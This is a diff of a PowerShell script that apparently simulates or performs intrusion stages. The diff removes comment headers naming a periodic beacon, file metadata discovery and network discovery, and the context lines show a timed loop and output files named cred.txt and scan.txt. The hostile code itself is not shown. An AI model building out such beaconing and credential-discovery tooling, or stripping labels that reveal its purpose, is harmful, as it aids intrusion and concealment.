@@ -16,11 +16,6 @@ $marker = "$root\s1.txt"
 "Executed: $(Get-Date)" |
     Out-File $marker -Encoding UTF8
 
-
-# ------------------------------------------------------------
-# Stage 1 - periodic one-way beacon
-# ------------------------------------------------------------
-
 $startTime = Get-Date
 $endTime = $startTime.AddHours(1)
 
@@ -53,11 +48,6 @@ while ((Get-Date) -lt $endTime) {
 
     Start-Sleep -Seconds $sleepSeconds
 }
-
-
-# ------------------------------------------------------------
-# Stage 2 - file metadata discovery
-# ------------------------------------------------------------
 
 $discoveryLog = "$resultFolder\cred.txt"
 
@@ -110,11 +100,6 @@ try {
         -ErrorAction Stop
 }
 catch {}
-
-
-# ------------------------------------------------------------
-# Stage 3 - restricted network discovery
-# ------------------------------------------------------------
 
 $scanResult = "$resultFolder\scan.txt"
 
